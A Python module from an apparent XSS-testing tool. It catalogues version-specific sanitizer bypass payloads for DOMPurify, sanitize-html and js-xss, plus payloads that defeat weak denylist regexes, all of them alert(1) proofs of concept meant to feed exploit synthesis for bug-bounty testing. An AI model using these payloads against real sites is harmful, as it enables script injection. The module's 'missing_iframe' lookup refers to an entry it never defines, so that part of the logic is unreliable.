"""Known-bypass corpus for sanitizers and ad-hoc denylist regexes.

Plan: plans/ARCHITECTURE_EVOLUTION.md §5.

Two consumers:

1. ``sanitizer_registry.evaluate`` — for version-specific bypass payloads
   we want to surface alongside the confidence downgrade. The version
   range data itself lives in ``taxonomies/sanitizer_metadata.json``;
   this module's role is to attach concrete *payloads* and *references*
   to those entries.

2. ``regex_sanitizer_weakness`` — for hand-rolled denylist regexes the
   bundle ships (``s.replace(/<script>/gi, '')`` style). Given a regex
   pattern, return the smallest payload that bypasses it.

Designed to be expanded — the corpus today is intentionally small and
focused on the bypasses that matter on real bug-bounty engagements.
Add more as we observe them in the wild.

Pure module — no IO, no LLM, no globals beyond the corpus constants.
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from typing import Iterable

__all__ = [
    "KnownBypass",
    "RegexWeakness",
    "lookup_library_bypass",
    "regex_sanitizer_weakness",
    "find_payload",
    "ALL_BYPASSES",
]


@dataclass(frozen=True)
class KnownBypass:
    library: str
    version_range: str
    payload: str
    notes: str = ""
    reference: str = ""


@dataclass(frozen=True)
class RegexWeakness:
    name: str
    matches_regex: re.Pattern
    payload: str
    notes: str


# ── DOMPurify ────────────────────────────────────────────────────────────

DOMPURIFY_BYPASSES: tuple[KnownBypass, ...] = (
    KnownBypass(
        library="dompurify",
        version_range="<2.0.17",
        payload="""<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>""",
        notes="mXSS via Mutation breakout (cure53/DOMPurify#345).",
        reference="https://research.securitum.com/dompurify-bypass-using-mxss/",
    ),
    KnownBypass(
        library="dompurify",
        version_range="<2.2.9",
        payload="""<form id=x><form><button popovertarget=x>X""",
        notes="form mutation bypass.",
        reference="https://github.com/cure53/DOMPurify/issues/511",
    ),
    KnownBypass(
        library="dompurify",
        version_range="<2.3.5",
        payload="""<noscript><p title="</noscript><img src=x onerror=alert(1)>">""",
        notes="noscript namespace confusion.",
        reference="https://github.com/cure53/DOMPurify/issues/578",
    ),
    KnownBypass(
        library="dompurify",
        version_range="<2.4.0",
        payload="""<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0nWCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4PSdodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rJyB4bGluazp4PSdYJz48aW1hZ2UgaHJlZj0neGV2ZW50JyBvbmVycm9yPSdhbGVydCgxKScvPjwvc3ZnPg==#X"/></svg>""",
        notes="SVG use href external bypass.",
        reference="https://github.com/cure53/DOMPurify/issues/700",
    ),
    KnownBypass(
        library="dompurify",
        version_range="<3.0.6",
        payload="""<template><form><img src=x onerror=alert(1)>""",
        notes="nested template/form confusion.",
        reference="https://github.com/cure53/DOMPurify/issues/923",
    ),
    KnownBypass(
        library="dompurify",
        version_range="<3.1.3",
        payload="""<svg><template><noscript><img src=x onerror=alert(1)></noscript></template></svg>""",
        notes="nested template node-comparison bypass.",
        reference="https://github.com/cure53/DOMPurify/issues/995",
    ),
    KnownBypass(
        library="dompurify",
        version_range="<3.2.4",
        payload="""<math><mtext><table><mglyph><style><img title="</style><img src=x onerror=alert(1)//">""",
        notes="MathML+noscript mXSS chain.",
        reference="https://github.com/cure53/DOMPurify/issues/1062",
    ),
)


# ── sanitize-html ───────────────────────────────────────────────────────

SANITIZE_HTML_BYPASSES: tuple[KnownBypass, ...] = (
    KnownBypass(
        library="sanitize-html",
        version_range="<2.7.1",
        payload="""<a href="javascript&#9;:alert(1)">x</a>""",
        notes="javascript: protocol obfuscation via embedded TAB.",
        reference="https://github.com/apostrophecms/sanitize-html/issues/581",
    ),
)


# ── leizongmin/xss ──────────────────────────────────────────────────────

XSS_LIB_BYPASSES: tuple[KnownBypass, ...] = (
    KnownBypass(
        library="xss",
        version_range="<1.0.10",
        payload="""<img src=x onerror=alert(1)>""",
        notes="attribute value parsing bypass (whitespace handling).",
        reference="https://github.com/leizongmin/js-xss/issues",
    ),
)


ALL_BYPASSES: tuple[KnownBypass, ...] = (
    *DOMPURIFY_BYPASSES,
    *SANITIZE_HTML_BYPASSES,
    *XSS_LIB_BYPASSES,
)


def lookup_library_bypass(library: str, version: str) -> list[KnownBypass]:
    """Return all bypass entries for which ``version`` satisfies the range."""
    from modules.js_analyzer.sanitizer_registry import version_in_range
    if not library or not version:
        return []
    lib_l = library.lower()
    return [
        b for b in ALL_BYPASSES
        if b.library == lib_l and version_in_range(version, b.version_range)
    ]


# ── Regex-sanitizer weakness analysis ───────────────────────────────────


def _payload_for(weak_name: str) -> str:
    return {
        "case_insensitive_script_tag":  "<ScRiPt>alert(1)</ScRiPt>",
        "missing_svg":                  "<svg onload=alert(1)>",
        "missing_img":                  "<img src=x onerror=alert(1)>",
        "missing_iframe":               "<iframe src=javascript:alert(1)>",
        "missing_form_action":          "<form action=javascript:alert(1)><button>x</button></form>",
        "missing_data_uri":             "<a href=data:text/html,<script>alert(1)</script>>x</a>",
        "missing_javascript_uri":       "<a href=javascript:alert(1)>x</a>",
        "missing_event_handlers":       "<body onload=alert(1)>",
        "missing_style_expression":     "<div style=behavior:url(#default#time2) onbegin=alert(1)>",
        "no_global_flag":               "<script>alert(1)</script><script>alert(2)</script>",
        "no_unicode_normalization":     "<źcript>alert(1)</źcript>",
        "single_pass":                  "<scr<script>ipt>alert(1)</script>",
        "ampersand_decode":             "<a href=\"jav&#x09;ascript:alert(1)\">x</a>",
    }.get(weak_name, "")


_KNOWN_WEAKNESSES: tuple[RegexWeakness, ...] = (
    RegexWeakness(
        name="case_insensitive_script_tag",
        matches_regex=re.compile(r"<script\b|/script\s*>", re.IGNORECASE),
        payload=_payload_for("case_insensitive_script_tag"),
        notes="Regex strips literal `<script>` only — case-changing bypass still works without /i.",
    ),
    RegexWeakness(
        name="missing_event_handlers",
        matches_regex=re.compile(r"<script\b|<iframe\b|<object\b", re.IGNORECASE),
        payload=_payload_for("missing_event_handlers"),
        notes="Filters tag names only — event handlers on safe tags still fire.",
    ),
    RegexWeakness(
        name="missing_svg",
        matches_regex=re.compile(r"<script\b", re.IGNORECASE),
        payload=_payload_for("missing_svg"),
        notes="Misses SVG-based payloads (onload/animate).",
    ),
    RegexWeakness(
        name="missing_img",
        matches_regex=re.compile(r"<script\b", re.IGNORECASE),
        payload=_payload_for("missing_img"),
        notes="Misses <img onerror=>.",
    ),
    RegexWeakness(
        name="missing_javascript_uri",
        matches_regex=re.compile(r"<script\b|<iframe\b", re.IGNORECASE),
        payload=_payload_for("missing_javascript_uri"),
        notes="Misses javascript: URIs in href.",
    ),
    RegexWeakness(
        name="no_global_flag",
        matches_regex=re.compile(r"<script\b", re.IGNORECASE),
        payload=_payload_for("no_global_flag"),
        notes="Likely single-occurrence strip — repeated payloads survive.",
    ),
    RegexWeakness(
        name="single_pass",
        matches_regex=re.compile(r"<script\s*>|</script\s*>", re.IGNORECASE),
        payload=_payload_for("single_pass"),
        notes="Single-pass strip lets nested re-form the tag.",
    ),
    RegexWeakness(
        name="ampersand_decode",
        matches_regex=re.compile(r"javascript:", re.IGNORECASE),
        payload=_payload_for("ampersand_decode"),
        notes="Filter looks at literal `javascript:` — HTML entity / hex encodings bypass.",
    ),
)


def regex_sanitizer_weakness(
    raw_regex: str,
    *,
    flags_str: str = "",
) -> RegexWeakness | None:
    """Given the literal regex used as a sanitizer, return the best-matching
    weakness entry or None.

    ``flags_str`` is the JS regex flags (``"gi"``, ``"i"``, etc.).
    """
    if not raw_regex:
        return None
    rl = raw_regex.lower()
    has_i = "i" in flags_str.lower()
    has_g = "g" in flags_str.lower()

    if "<script" in rl and not has_i:
        return next((w for w in _KNOWN_WEAKNESSES if w.name == "case_insensitive_script_tag"), None)
    if "<script" in rl and not has_g:
        return next((w for w in _KNOWN_WEAKNESSES if w.name == "no_global_flag"), None)
    if "<script" in rl and ">" in rl and "</script" not in rl:
        return next((w for w in _KNOWN_WEAKNESSES if w.name == "single_pass"), None)
    if "<script" in rl and "<svg" not in rl and "<img" not in rl:
        # picks first hit; both apply
        return next((w for w in _KNOWN_WEAKNESSES if w.name == "missing_svg"), None)
    if "javascript:" in rl and "&#" not in rl:
        return next((w for w in _KNOWN_WEAKNESSES if w.name == "ampersand_decode"), None)
    if "<script" in rl and "<iframe" not in rl and "<object" not in rl:
        return next((w for w in _KNOWN_WEAKNESSES if w.name == "missing_iframe"), None)
    if any(k in rl for k in ("<script", "<iframe", "<object")):
        return next((w for w in _KNOWN_WEAKNESSES if w.name == "missing_event_handlers"), None)
    return None


def find_payload(
    *,
    sink_id: str,
    library: str | None = None,
    version: str | None = None,
    raw_regex: str | None = None,
    regex_flags: str = "",
) -> str:
    """Best single-payload suggestion for the LLM exploit-synthesis stage.

    Search order:
      1. library+version bypass corpus
      2. regex weakness lookup
      3. generic payload by sink class
    """
    if library and version:
        for b in lookup_library_bypass(library, version):
            return b.payload
    if raw_regex:
        w = regex_sanitizer_weakness(raw_regex, flags_str=regex_flags)
        if w:
            return w.payload
    # Fallback: generic per sink class.
    return _generic_payload_for_sink(sink_id)


def _generic_payload_for_sink(sink_id: str) -> str:
    if "innerHTML" in sink_id or "outerHTML" in sink_id or "insertAdjacent" in sink_id or sink_id == "document_write":
        return "<img src=x onerror=alert(1)>"
    if sink_id in ("eval_call", "new_Function", "setTimeout_string", "setInterval_string"):
        return "alert(1)"
    if sink_id.startswith("location_"):
        return "javascript:alert(1)"
    if sink_id == "srcdoc_assign" or sink_id == "iframe_srcdoc_assign":
        return "<script>alert(1)</script>"
    return ""
